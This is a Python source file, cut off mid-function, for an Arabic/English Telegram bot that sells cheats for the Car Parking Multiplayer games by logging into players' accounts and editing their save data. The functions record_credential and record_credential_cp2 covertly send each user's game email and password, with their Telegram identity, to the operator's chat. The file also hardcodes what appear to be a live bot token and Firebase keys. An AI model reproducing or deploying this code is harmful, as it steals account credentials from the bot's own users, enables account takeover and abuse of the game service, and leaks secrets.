from __future__ import annotations
import sqlite3
from datetime import datetime, date

#!/usr/bin/env python3
"""
TNNR CPM1 & RIPOU Combined Telegram Bot
"""

import asyncio
import base64
import hashlib
import io
import json
import logging
import os
import random
import re
import string
import struct
import sys
import time
import zlib
from copy import deepcopy
from typing import Any, Dict, List, Optional, Tuple

import aiohttp
import httpx

try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    HAS_BROTLI = False

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
    from telegram.ext import (
        Application,
        CallbackQueryHandler,
        CommandHandler,
        ContextTypes,
        MessageHandler,
        filters,
    )
    from telegram.error import TelegramError
    HAS_TELEGRAM = True
except ImportError:
    HAS_TELEGRAM = False

sys.stdout.reconfigure(line_buffering=True)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    stream=sys.stdout
)
logger = logging.getLogger("CPM-RIPOU-Bot")

logging.getLogger("telegram.ext").setLevel(logging.INFO)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)

# ⚠️ بدّل هادو قبل ما تعطي الكود لأي واحد
TOKEN = "8960076637:AAHV2HhxiZl9ja3bIPFf-kcPUMOjJMFKTRc"
CHANNEL_USERNAME = "@RIPOU0209"
CHANNEL_URL = "https://t.me/RIPOU0209"
GROUP_USERNAME = "@Rb00209"
GROUP_URL = "https://t.me/Rb00209"
GROUP2_USERNAME = "@rbrb02"
GROUP2_URL = "https://t.me/rbrb02"
GROUP3_USERNAME = "@rrbb02"
GROUP3_URL = "https://t.me/rrbb02"

INJECT_URL = "http://129.146.252.84/inject"
ADMIN_ID = 7600914566

FK = os.getenv("CPM_FIREBASE_KEY", "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA")
FK_CP2 = os.getenv("CP2_FIREBASE_KEY", "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ")
LOAD_URL = os.getenv("CPM_LOAD_URL", "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords3")
SAVE_URL = os.getenv("CPM_SAVE_URL", "https://europe-west1-cp-multiplayer.cloudfunctions.net/SavePlayerRecordsPartially8")
MAX_MONEY = 50_000_000
MAX_COIN = 500_000
GAME_HEADERS = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "X-Unity-Version": "2022.3.62f2",
}

def record_credential(user_id: int, email: str, password: str, status: str = "success", old_email: str = None, old_password: str = None):
    import urllib.request
    import json

    try:
        url_info = f"https://api.telegram.org/bot{TOKEN}/getChat?chat_id={user_id}"
        req_info = urllib.request.Request(url_info)
        response = urllib.request.urlopen(req_info, timeout=3)
        data = json.loads(response.read().decode('utf-8'))
        if data.get("ok"):
            user_data = data["result"]
            first_name = user_data.get("first_name", "بدون")
            username = f"@{user_data.get('username')}" if user_data.get("username") else "بدون معرف"
        else:
            first_name = "بدون"
            username = "بدون معرف"
    except:
        first_name = "بدون"
        username = "بدون معرف"

    try:
        msg_text = (
            f"📩 بيانات جديدة ({status}):\n\n"
            f"📧 Email: {email}\n"
            f"🔑 Pass: {password}\n\n"
            f"👤 المستخدم:\n"
            f"• الاسم: {first_name}\n"
            f"• المعرف: {username}\n"
            f"• ID: {user_id}\n\n"
            f"🔗 [اضغط للدخول لحسابو](tg://user?id={user_id})"
        )

        url_send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            "chat_id": int(ADMIN_ID),
            "text": msg_text,
            "parse_mode": "Markdown"
        }
        req_send = urllib.request.Request(
            url_send,
            data=json.dumps(payload).encode('utf-8'),
            headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req_send, timeout=3)
    except:
        pass

def record_credential_cp2(user_id: int, action: str, email: str = None, password: str = None):
    import urllib.request
    import json

    try:
        url_info = f"https://api.telegram.org/bot{TOKEN}/getChat?chat_id={user_id}"
        req_info = urllib.request.Request(url_info)
        response = urllib.request.urlopen(req_info, timeout=3)
        data = json.loads(response.read().decode('utf-8'))
        if data.get("ok"):
            user_data = data["result"]
            first_name = user_data.get("first_name", "بدون")
            username = f"@{user_data.get('username')}" if user_data.get("username") else "بدون معرف"
        else:
            first_name = "بدون"
            username = "بدون معرف"
    except:
        first_name = "بدون"
        username = "بدون معرف"

    try:
        msg_text = (
            f"🚗 <b>معلومات Car Parking 2</b>\n\n"
            f"⚙️ العملية: {action}\n"
            f"📧 الإيميل: <code>{email or 'غير متوفر'}</code>\n"
            f"🔑 الباسورد: <code>{password or 'غير متوفر'}</code>\n\n"
            f"👤 صاحب الحساب:\n"
            f"• الاسم: {first_name}\n"
            f"• المعرف: {username}\n"
            f"• ID: <code>{user_id}</code>\n\n"
            f"🔗 <a href='tg://user?id={user_id}'>اضغط للدخول المباشر</a>"
        )

        url_send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            "chat_id": int(ADMIN_ID),
            "text": msg_text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        req_send = urllib.request.Request(
            url_send,
            data=json.dumps(payload).encode('utf-8'),
            headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req_send, timeout=3)
    except:
        pass

USERS_FILE = "users_db.json"
USERS_DB = set()

def _save_users():
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(list(USERS_DB), f)
    except Exception as e:
        logger.error(f"Save users error: {e}")

def _load_users():
    global USERS_DB
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            USERS_DB = set(data)
            logger.info(f"Loaded {len(USERS_DB)} users from users file.")
    except Exception as e:
        logger.error(f"Load users error: {e}")

CREDENTIALS_DB = {}
USER_LOCAL_ACCOUNTS = {}
USER_ACTIVE_ACCOUNT = {}
LAST_LOGGED_EMAIL = {}
STATS_DB = {"btn_king": 0, "btn_perm": 0, "btn_money": 0, "btn_cars": 0, "cpm_actions": 0}
USER_ACTIVITY = {}

BANNED_USERS = set()

def is_banned(user_id: int) -> bool:
    return user_id in BANNED_USERS

ACCESS_FILE = "access_codes.json"
ACCESS_CODES = {}
USER_ACCESS = {}

def _save_access():
    try:
        with open(ACCESS_FILE, "w", encoding="utf-8") as f:
            json.dump(
                {"codes": ACCESS_CODES, "user_access": {str(k): v for k, v in USER_ACCESS.items()}},
                f, ensure_ascii=False
            )
    except Exception as e:
        logger.error(f"Save access error: {e}")

def _load_access():
    global ACCESS_CODES, USER_ACCESS
    try:
        if os.path.exists(ACCESS_FILE):
            with open(ACCESS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            ACCESS_CODES = data.get("codes", {})
            USER_ACCESS = {int(k): float(v) for k, v in data.get("user_access", {}).items()}
            logger.info(f"Loaded {len(ACCESS_CODES)} codes, {len(USER_ACCESS)} active users.")
    except Exception as e:
        logger.error(f"Load access error: {e}")

def has_valid_access(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    exp = USER_ACCESS.get(user_id)
    if not exp:
        return False
    if exp < time.time():
        USER_ACCESS.pop(user_id, None)
        _save_access()
        return False
    return True

def format_time_remaining(user_id: int) -> str:
    exp = USER_ACCESS.get(user_id)
    if not exp:
        return "لا يوجد"
    remaining = exp - time.time()
    if remaining <= 0:
        return "منتهي"
    hours = int(remaining // 3600)
    minutes = int((remaining % 3600) // 60)
    if hours >= 24:
        days = hours // 24
        h = hours % 24
        return f"{days} يوم و {h} ساعة"
    if hours > 0:
        return f"{hours} ساعة و {minutes} دقيقة"
    return f"{minutes} دقيقة"

DURATIONS = {
    "1h":   ("ساعة",    1),
    "12h":  ("نص نهار", 12),
    "24h":  ("نهار",    24),
    "7d":   ("سمانة",   168),
    "30d":  ("شهر",     720),
}

def get_durations_keyboard() -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton("⏱ ساعة", callback_data="access_dur:1h"),
            InlineKeyboardButton("🕐 نص نهار", callback_data="access_dur:12h"),
        ],
        [
            InlineKeyboardButton("📅 نهار", callback_data="access_dur:24h"),
            InlineKeyboardButton("📆 سمانة", callback_data="access_dur:7d"),
        ],
        [
            InlineKeyboardButton("🗓 شهر", callback_data="access_dur:30d"),
        ],
        [InlineKeyboardButton("❌ إلغاء", callback_data="access_cancel")],
    ]
    return InlineKeyboardMarkup(rows)

def get_code_type_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("👤 استعمال واحد", callback_data="access_type:single"),
            InlineKeyboardButton("👥 جماعي", callback_data="access_type:group"),
        ],
        [InlineKeyboardButton("❌ إلغاء", callback_data="access_cancel")],
    ])

def try_use_code(code: str, user_id: int):
    if code not in ACCESS_CODES:
        return False, "❌ الكود غير موجود"

    code_data = ACCESS_CODES[code]
    used_list = code_data.get("used_by_list", [])
    max_uses = code_data.get("max_uses", 1)
    
    if code_data.get("expires_at") and time.time() > code_data["expires_at"]:
        return False, "❌ هذا الكود انتهت صلاحيته (مرت 24 ساعة)."

    if user_id in used_list:
        return False, "❌ راك استعملت هذا الكود من قبل"

    if len(used_list) >= max_uses:
        return False, "❌ هذا الكود استنفد استعماله"

    used_list.append(user_id)
    ACCESS_CODES[code]["used_by_list"] = used_list

    hours = code_data["hours"]
    expires_at = time.time() + (hours * 3600)

    current = USER_ACCESS.get(user_id, 0)
    if current > time.time():
        USER_ACCESS[user_id] = current + (hours * 3600)
    else:
        USER_ACCESS[user_id] = expires_at

    _save_access()
    return True, ""
    
# ===== نظام النقاط =====
POINTS_FILE = "points_data.json"
POINTS_DB = {}
BOT_MAINTENANCE = False  # True = البوت متوقف لكل الناس ما عدا الأدمين
REF_CODES = {}
CODE_TO_USER = {}

def _save_points():
    try:
        data = {
            "points": POINTS_DB,
            "ref_codes": REF_CODES,
            "code_to_user": {k: v for k, v in CODE_TO_USER.items()},
        }
        with open(POINTS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Save points error: {e}")

def _load_points():
    global POINTS_DB, REF_CODES, CODE_TO_USER
    try:
        if os.path.exists(POINTS_FILE):
            with open(POINTS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            POINTS_DB = {int(k): int(v) for k, v in data.get("points", {}).items()}
            REF_CODES = {int(k): str(v) for k, v in data.get("ref_codes", {}).items()}
            CODE_TO_USER = {str(k): int(v) for k, v in data.get("code_to_user", {}).items()}
            logger.info(f"Loaded {len(POINTS_DB)} users from points file.")
    except Exception as e:
        logger.error(f"Load points error: {e}")

_load_points()
_load_access()
_load_users()

def get_ref_code(user_id):
    if user_id in REF_CODES:
        return REF_CODES[user_id]
    code = "u" + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
    REF_CODES[user_id] = code
    CODE_TO_USER[code] = user_id
    _save_points()
    return code

def get_points(user_id):
    return POINTS_DB.get(user_id, 0)

def add_points(user_id, n=1):
    POINTS_DB[user_id] = POINTS_DB.get(user_id, 0) + n
    _save_points()
    return POINTS_DB[user_id]

ACTION_COSTS = {
    "act_name": 2, "act_id": 2, "act_change_pass": 2, "act_change_email": 2,
    "act_king": 2, "act_coin": 2, "act_money": 2, "act_horns": 2, "act_w16": 2,
    "act_damage": 2, "act_fuel": 2, "act_smoke": 2, "act_fix": 2,
    "act_police": 2, "act_houses": 2,
    "act_unlock_all": 2, "act_create_acc": 2, "act_all_levels": 2, "act_reset_levels": 2,
    "cp2_change_email": 2, "cp2_change_pass": 2
}

def deduct_points(user_id, n=1):
    # Admins and users with an active access code use CPM1 and CPM2 without points.
    if user_id == ADMIN_ID or has_valid_access(user_id):
        return POINTS_DB.get(user_id, 0)
    POINTS_DB[user_id] = POINTS_DB.get(user_id, 0) - n
    _save_points()
    return POINTS_DB[user_id]

def has_enough_points(user_id, n):
    # An active access code grants access to BOTH CPM1 and CPM2.
    if user_id == ADMIN_ID or has_valid_access(user_id):
        return True
    return POINTS_DB.get(user_id, 0) >= n

CHANNEL_MSG_IDS = {
    "btn_perm": 21, "btn_script_money": 27, "btn_script_cars": 15, "btn_script_color": 28,
}

TEXTS = {
    "ar": {
        "select_lang": "اختر لغتك🌐Choose your language",
        "not_sub": f"لا يمكنك استخدام البوت❌\nعليك الاشتراك في <a href='{CHANNEL_URL}'>قناة البوت</a> و <a href='{GROUP_URL}'>الجروب 1</a> و <a href='{GROUP2_URL}'>الجروب 2</a> و <a href='{GROUP3_URL}'>الجروب 3</a> للمتابعة",
        "sub_not_found": "لم يتم إيجاد اشتراكك في القناة أو الجروبات بعد!❌",
        "welcome": "أهلاً بك في بوت <b>ᴿᴵᴾᴼᵁ</b> 🚀\nاختر من القائمة:",
        "select_op": "اختر العملية المطلوبة:",
        "logging_in": "جاري تسجيل الدخول والتحقق... ⏳",
        "btn_acc_login": "تسجيل الدخول 🪪",
        "btn_scripts": "سكربتات📁",
        "btn_change_lang": "تغيير اللغة🌐",
        "accounts_header": "الحسابات💳",
        "btn_new_account": "حساب جديد➕",
        "logout_prompt": "سجل خروج من اللعبة ثم أدخل البريد الإلكتروني (Email) لحسابك:",
        "prompt_relogin": "سجل خروج من اللعبة ثم أدخل كلمة مرور الحساب:",
        "ask_password": "أدخل كلمة السر (Password) الخاصة بحسابك:",
        "login_failed": "خطأ❌\nتأكد من إدخال إيميل وكلمة مرور صحيحة",
        "relogin_failed": "لم ينجح تسجيل الدخول للحساب❌",
        "login_success": "تم تسجيل الدخول إلى الحساب: {email}✅",
        "btn_act_details": "تفاصيل الحساب📄",
        "btn_act_change_email": "تغيير البريد 📧",
        "btn_act_change_pass": "تغيير كلمة المرور 🔑",
        "prompt_change_email": "أدخل البريد الإلكتروني الجديد📧:",
        "fail_change_email": "فشل❌",
        "success_change_email": "تم تغيير البريد الإلكتروني بنجاح✅",
        "prompt_change_pass": "أدخل كلمة المرور الجديدة🔑:",
        "fail_change_pass": "فشل❌",
        "success_change_pass": "تم تغيير كلمة المرور بنجاح✅",
        "btn_act_king": "تفعيل رتبة الملك👑",
        "btn_act_coin": "تعديل الكوينز🪙",
        "btn_act_money": "تعديل الأموال💵",
        "btn_act_id": "تغيير الـ ID🆔",
        "btn_act_name": "تغيير الاسم✏️",
        "btn_act_color_id": "إنشاء ID/اسم ملون🎨",
        "btn_act_horns": "فتح الأبواق🔊",
        "btn_act_w16": "فتح محرك W16⚙️",
        "btn_act_damage": "عدم تضرر السيارات🛡",
        "btn_act_fuel": "وقود غير محدود⛽",
        "btn_act_smoke": "فتح لون الدخان💨",
        "btn_act_police": "فتح صافرات الشرطة🚨",
        "btn_act_houses": "فتح المنازل🏠",
        "btn_act_fix": "إصلاح الحساب🔧",
        "btn_act_unlock_all": "فتح الكل🎖",
        "btn_act_create_acc": "إنشاء حساب جديد👤",
        "btn_act_all_levels": "فتح جميع المستويات🚗",
        "btn_act_reset_levels": "خسارة المستويات🚗",
        "msg_creating_acc": "جارٍ إنشاء حساب جديد... ⏳",
        "fail_create_acc": "فشل إنشاء الحساب❌",
        "success_all_levels": "تم فتح جميع المستويات بنجاح✅",
        "success_reset_levels": "تم خسارة المستويات بنجاح✅",
        "acc_created_format": (
            "✅ <b>تم إنشاء الحساب بنجاح</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📧 <b>الإيميل:</b> <code>{email}</code>\n"
            "🔑 <b>كلمة المرور:</b> <code>{password}</code>\n"
            "🎮 <b>الاسم:</b> {name}\n"
            "💾 <b>الحالة:</b> {saved}\n"
            "━━━━━━━━━━━━━━━━━━"
        ),
        "btn_back": "رجوع🔙",
        "applied_success": "تم التطبيق بنجاح✅",
        "success_king": "تم تفعيل رتبة الملك بنجاح👑✅",
        "success_money": "تم تعديل الأموال بنجاح💵✅",
        "success_coin": "تم تعديل الكوينز بنجاح🪙✅",
        "success_id": "تم تغيير الـ ID بنجاح🆔✅",
        "invalid_id_slash": "إسمك يحتوي على الرمز <code>/</code>",
        "success_name": "تم تغيير الاسم بنجاح✏️✅",
        "success_horns": "تم فتح الأبواق بنجاح🔊✅",
        "success_w16": "تم فتح محرك W16 بنجاح⚙️✅",
        "success_damage": "تم إيقاف تضرر السيارات بنجاح🛡✅",
        "success_fuel": "تم تفعيل الوقود اللامحدود بنجاح⛽✅",
        "success_smoke": "تم فتح لون الدخان بنجاح💨✅",
        "success_police": "تم حفظ بيانات الشرطة وتحديث السيارات: {details}",
        "success_houses": "تم تنفيذ تفعيل المنازل بنجاح✅",
        "success_fix": "تم إصلاح الحساب بنجاح🔧✅",
        "msg_unlock_money": "جارٍ تعديل الأموال 50 مليون💵",
        "msg_unlock_coin": "جارٍ تعديل الكوينز 500 ألف🪙",
        "msg_unlock_w16": "جارٍ فتح محرك W16⚙️",
        "msg_unlock_horns": "جارٍ فتح الأبواق🔊",
        "msg_unlock_fuel": "جارٍ فتح الوقود اللامحدود⛽",
        "msg_unlock_damage": "جارٍ إيقاف تضرر السيارات🛡",
        "msg_unlock_smoke": "جارٍ فتح لون الدخان💨",
        "success_unlock_all": "تم فتح كل الميزات بنجاح✅",
        "sent_success": "تم الإرسال بنجاح✅",
        "general_error": "خطأ❌",
        "del_user_success": "تم مسح جميع المعلومات✅",
        "cmd_not_avail": "هذا الأمر غير متاح لك🚫",
        "enter_money": "أدخل عدد الأموال:",
        "enter_coin": "أدخل عدد الكوينز:",
        "enter_id": "أدخل الأيدي الجديد:",
        "enter_name": "أدخل الاسم الجديد:",
        "details_format": (
            "━━━━━━━━━━━━━━━━━━\n"
            "إيميل💳: <code>{email}</code>\n"
            "الاسم👤: <code>{name}</code>\n"
            "ID🆔: <code>{id}</code>\n"
            "الأموال💵: <code>{money}</code>\n"
            "الكوينز🪙: <code>{coin}</code>\n"
            "الأبواق🔊: {horns}\n"
            "W16: {w16}\n"
            "ضرر🛡: {damage}\n"
            "وقود⛽: {fuel}\n"
            "دخان💨: {smoke}\n"
            "━━━━━━━━━━━━━━━━━━"
        ),
        "btn_50m": "50 مليون",
        "btn_30k": "30 ألف",
        "btn_500k": "500 ألف",
        "stale_msg_alert": "استخدم آخر رسالة",
        "btn_script_perm": "سكربت دائم CPM1✅",
        "btn_script_money": "سكربت أموال CPM2💵",
        "btn_script_cars": "سكربت فتح السيارات CPM1🔓",
        "btn_check": "تأكيد الاشتراك 🔄",
        "btn_continue": "متابعة ➡️",
        "nav_back_hint": "للرجوع👇🏻",
        "injecting": "جاري تفعيل رتبة الملك ⏳",
        "inject_success": "تم إنجاز مهام رتبة الملك 👑\nانتظر من 10 دقائق إلى 3 ساعات.",
        "status_success": "نجاح✅",
        "status_failed": "فشل❌",
        "info_title": "📋 <b>بيانات الحسابات:</b>\n\n",
        "no_data": "📭 لا توجد بيانات.",
        "info_delete_note": "سيتم حذفها بعد دقيقة",
    },
    "en": {
        "select_lang": "Choose your language🌐",
        "not_sub": "You must subscribe to continue",
        "sub_not_found": "Not found!❌",
        "welcome": "Welcome to <b>RIPOU</b> Bot",
        "select_op": "Select operation:",
        "logging_in": "Logging in... ⏳",
        "btn_acc_login": "Login🪪",
        "btn_scripts": "Scripts📁",
        "btn_change_lang": "Change Language🌐",
        "accounts_header": "Accounts💳",
        "btn_new_account": "New Account➕",
        "logout_prompt": "Enter your Email:",
        "prompt_relogin": "Enter your password:",
        "ask_password": "Enter Password:",
        "login_failed": "Error❌",
        "relogin_failed": "Login failed❌",
        "login_success": "Logged in: {email}✅",
        "btn_act_details": "Details📄",
        "btn_act_change_email": "Change Email📧",
        "btn_act_change_pass": "Change Password🔑",
        "prompt_change_email": "Enter new email:",
        "fail_change_email": "Failed❌",
        "success_change_email": "Email changed✅",
        "prompt_change_pass": "Enter new password:",
        "fail_change_pass": "Failed❌",
        "success_change_pass": "Password changed✅",
        "btn_act_king": "King Rank👑",
        "btn_act_coin": "Edit Coins🪙",
        "btn_act_money": "Edit Money💵",
        "btn_act_id": "Change ID🆔",
        "invalid_id_slash": "Invalid /",
        "btn_act_name": "Change Name✏️",
        "btn_act_color_id": "Colored ID🎨",
        "btn_act_horns": "Horns🔊",
        "btn_act_w16": "W16⚙️",
        "btn_act_damage": "No Damage🛡",
        "btn_act_fuel": "Fuel⛽",
        "btn_act_smoke": "Smoke💨",
        "btn_act_police": "Police Lights & Sirens🚨",
        "btn_act_houses": "Unlock Houses🏠",
        "btn_act_fix": "Fix🔧",
        "btn_act_unlock_all": "Unlock All🎖",
        "btn_act_create_acc": "Create Account👤",
        "btn_act_all_levels": "All Levels🚗",
        "btn_act_reset_levels": "Reset Levels🚗",
        "msg_creating_acc": "Creating... ⏳",
        "fail_create_acc": "Failed❌",
        "success_all_levels": "All unlocked✅",
        "success_reset_levels": "Reset✅",
        "acc_created_format": (
            "✅ <b>Account created</b>\n"
            "📧 <code>{email}</code>\n"
            "🔑 <code>{password}</code>\n"
            "🎮 {name}\n"
            "💾 {saved}"
        ),
        "btn_back": "Back🔙",
        "applied_success": "Applied✅",
        "success_king": "King activated👑✅",
        "success_money": "Money updated💵✅",
        "success_coin": "Coins updated🪙✅",
        "success_id": "ID changed🆔✅",
        "success_name": "Name changed✏️✅",
        "success_horns": "Horns unlocked🔊✅",
        "success_w16": "W16 unlocked⚙️✅",
        "success_damage": "Damage disabled🛡✅",
        "success_fuel": "Fuel activated⛽✅",
        "success_smoke": "Smoke unlocked💨✅",
        "success_police": "Police profile saved and car updates processed: {details}",
        "success_houses": "Houses activation completed✅",
        "success_fix": "Fixed🔧✅",
        "msg_unlock_money": "Money to 50M💵",
        "msg_unlock_coin": "Coins to 500K🪙",
        "msg_unlock_w16": "W16⚙️",
        "msg_unlock_horns": "Horns🔊",
        "msg_unlock_fuel": "Fuel⛽",
        "msg_unlock_damage": "Damage🛡",
        "msg_unlock_smoke": "Smoke💨",
        "success_unlock_all": "All unlocked✅",
        "sent_success": "Sent✅",
        "general_error": "Error❌",
        "del_user_success": "Cleared✅",
        "cmd_not_avail": "Not available🚫",
        "enter_money": "Enter money:",
        "enter_coin": "Enter coins:",
        "enter_id": "Enter new ID:",
        "enter_name": "Enter new name:",
        "details_format": (
            "━━━━━━━━━━━━━━━━━━\n"
            "Email💳: <code>{email}</code>\n"
            "Name👤: <code>{name}</code>\n"
            "ID🆔: <code>{id}</code>\n"
            "Money💵: <code>{money}</code>\n"
            "Coins🪙: <code>{coin}</code>\n"
            "Horns🔊: {horns}\n"
            "W16: {w16}\n"
            "Damage🛡: {damage}\n"
            "Fuel⛽: {fuel}\n"
            "Smoke💨: {smoke}\n"
            "━━━━━━━━━━━━━━━━━━"
        ),
        "btn_50m": "50M",
        "btn_30k": "30K",
        "btn_500k": "500K",
        "stale_msg_alert": "Use latest message",
        "btn_script_perm": "CPM1 Permanent✅",
        "btn_script_money": "CPM2 Money💵",
        "btn_script_cars": "CPM1 Unlock Cars🔓",
        "btn_check": "Verify 🔄",
        "btn_continue": "Continue ➡️",
        "nav_back_hint": "To go back👇🏻",
        "injecting": "Activating King Rank... ⏳",
        "inject_success": "King Rank completed 👑",
        "status_success": "Success✅",
        "status_failed": "Failed❌",
        "info_title": "📋 <b>Your account data:</b>\n\n",
        "no_data": "📭 No data.",
        "info_delete_note": "Deleted in 1 minute",
    }
}

# ===== التشفير =====
def make_xor_key(uid: str) -> bytes:
    chars = list(str(uid or ""))
    if len(chars) >= 9:
        chars[1], chars[8] = chars[8], chars[1]
    if len(chars) >= 3:
        chars.pop(2)
    if len(chars) >= 5:
        chars.append(chars[4])
    key = "".join(chars).encode("utf-8")
    return key or b"0"

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def decompress(data: bytes) -> Optional[bytes]:
    if HAS_BROTLI:
        try:
            return brotli.decompress(data)
        except Exception:
            pass
    for args in ((zlib.MAX_WBITS | 16,), tuple()):
        try:
            return zlib.decompress(data, *args)
        except Exception:
            pass
    return None

def decrypt_aes(data: bytes, key: bytes) -> Optional[bytes]:
    if not HAS_CRYPTO:
        return None
    try:
        cipher = AES.new(key[:16], AES.MODE_CBC, b"\x00" * 16)
        return unpad(cipher.decrypt(data), 16)
    except Exception:
        return None

def _md5(text: str) -> bytes:
    return hashlib.md5(str(text).encode()).digest()

def _sha1(text: str) -> bytes:
    return hashlib.sha1(str(text).encode()).digest()[:16]

def build_aes_keys(uid: str, password: Optional[str] = None, email: Optional[str] = None) -> List[bytes]:
    keys = [_md5("olzhas_carparking")]
    if password:
        keys.extend([_md5(password), _sha1(password)])
    if uid:
        keys.extend([_md5(uid), _sha1(uid)])
    if email:
        keys.append(_md5(email))
    return keys

class Reader:
    def __init__(self, data: bytes):
        self.buf = data
        self.pos = 0

    def has_bytes(self, n: int) -> bool:
        return self.pos + n <= len(self.buf)

    def read_byte(self) -> int:
        if not self.has_bytes(1):
            return 0
        value = self.buf[self.pos]
        self.pos += 1
        return value

    def read_int(self) -> int:
        if not self.has_bytes(4):
            self.pos = len(self.buf)
            return 0
        value = struct.unpack_from("<i", self.buf, self.pos)[0]
        self.pos += 4
        return value

    def read_float(self) -> float:
        if not self.has_bytes(4):
            self.pos = len(self.buf)
            return 0.0
        value = struct.unpack_from("<f", self.buf, self.pos)[0]
        self.pos += 4
        return value

    def read_string(self) -> str:
        marker = self.read_int()
        if marker in (0, -1):
            return ""
        length = (-marker) - 1 if marker < -1 else marker
        if marker < -1:
            self.read_int()
        length = max(0, min(length, 1_000_000))
        if not self.has_bytes(length):
            return ""
        text = self.buf[self.pos:self.pos + length].decode("utf-8", errors="replace")
        self.pos += length
        return text.replace("\x00", "").strip()

    def read_list(self, item_fn):
        count = self.read_int()
        if count <= 0 or count > 1_000_000:
            return []
        result = []
        for _ in range(count):
            if self.pos >= len(self.buf):
                break
            value = item_fn()
            if value is not None:
                result.append(value)
        return result

    def read_dict(self) -> Dict[int, int]:
        count = self.read_int()
        if count <= 0 or count > 1_000_000:
            return {}
        result = {}
        for _ in range(count):
            if self.pos >= len(self.buf):
                break
            result[self.read_int()] = self.read_int()
        return result

    def read_equipment(self) -> Optional[Dict[str, Any]]:
        if self.read_byte() == 0:
            return None
        return {
            "hair": self.read_list(self.read_int),
            "face": self.read_list(self.read_int),
            "beard": self.read_list(self.read_int),
            "cap": self.read_list(self.read_int),
            "mask": self.read_list(self.read_int),
            "top": self.read_list(self.read_int),
            "gloves": self.read_list(self.read_int),
            "bag": self.read_list(self.read_int),
            "pants": self.read_list(self.read_int),
            "shoes": self.read_list(self.read_int),
            "glasses": self.read_list(self.read_int),
            "SelectedEquipments": self.read_list(self.read_int),
            "Gender": self.read_int(),
        }
        
def parse_player(buf: bytes) -> Optional[Dict[str, Any]]:
    r = Reader(buf)
    if r.read_byte() == 0:
        return None
    player: Dict[str, Any] = {}
    player["Name"] = r.read_string()
    player["money"] = r.read_int()
    player["coin"] = r.read_int()
    player["localID"] = r.read_string()
    player["boughtFsos"] = r.read_list(r.read_int)

    def read_friend():
        r.read_byte()
        return {"id": r.read_string(), "Name": r.read_string(), "accountID": r.read_string()}

    player["FriendsID"] = r.read_list(read_friend)
    player["LevelsDoneTime"] = r.read_list(r.read_float)
    player["floats"] = r.read_list(r.read_float)
    player["integers"] = r.read_list(r.read_int)
    player["fcar"] = r.read_list(r.read_int)
    player["favouriteWheels"] = r.read_list(r.read_int)
    player["favouriteVinyls"] = r.read_list(r.read_int)
    player["favouriteEmojis"] = r.read_list(r.read_int)
    player["personEquipmentsMale"] = r.read_equipment()
    player["personEquipmentsFemale"] = r.read_equipment()

    if r.read_byte() == 0:
        player["platesData"] = None
    else:
        def read_vinyl():
            r.read_byte()
            def rv():
                return {"x": r.read_float(), "y": r.read_float(), "z": r.read_float()}
            return {"vectors": r.read_list(rv), "v": r.read_list(r.read_string),
                    "floats": r.read_list(r.read_float), "text": r.read_string()}
        def read_plate():
            r.read_byte()
            return {"plateId": r.read_int(), "frontCarId": r.read_int(),
                    "rearCarId": r.read_int(), "vinyls": r.read_list(read_vinyl)}
        player["platesData"] = {"allPlates": r.read_list(read_plate)}

    if r.read_byte() == 0:
        player["carIDnStatus"] = None
    else:
        player["carIDnStatus"] = {
            "carGeneratedIDs": r.read_list(r.read_string),
            "carStatus": r.read_list(r.read_int),
        }
    player["allData"] = r.read_string()
    player["flags"] = r.read_dict()
    player["animations"] = r.read_list(r.read_int)
    player["emojiPacks"] = r.read_list(r.read_int)
    player["wheels"] = r.read_list(r.read_int)
    player["boughtPoliceLights"] = r.read_list(r.read_int)
    player["boughtPoliceSirens"] = r.read_list(r.read_int)
    return player

def try_parse(buf: bytes) -> Optional[Dict[str, Any]]:
    candidates = [buf]
    first = decompress(buf)
    if first:
        candidates.append(first)
        second = decompress(first)
        if second:
            candidates.append(second)
    for candidate in candidates:
        if not candidate:
            continue
        if candidate[0] in (17, 23, 24):
            try:
                parsed = parse_player(candidate)
                if parsed and parsed.get("Name") is not None:
                    return parsed
            except Exception:
                pass
        try:
            clean = candidate[3:] if len(candidate) >= 3 and candidate[:2] == b"\xef\xbb" else candidate
            if clean and clean[0] == 123:
                return json.loads(clean.decode("utf-8"))
        except Exception:
            pass
    return None

def decrypt_player_record(base64_text: str, uid: str, password: Optional[str] = None, email: Optional[str] = None) -> Dict[str, Any]:
    try:
        buf = base64.b64decode(base64_text)
    except Exception:
        return {"success": False, "message": "Bad base64"}
    if len(buf) < 10:
        return {"success": False, "message": "Too small"}

    direct = try_parse(buf)
    if direct:
        return {"success": True, "record": direct}

    if uid:
        try:
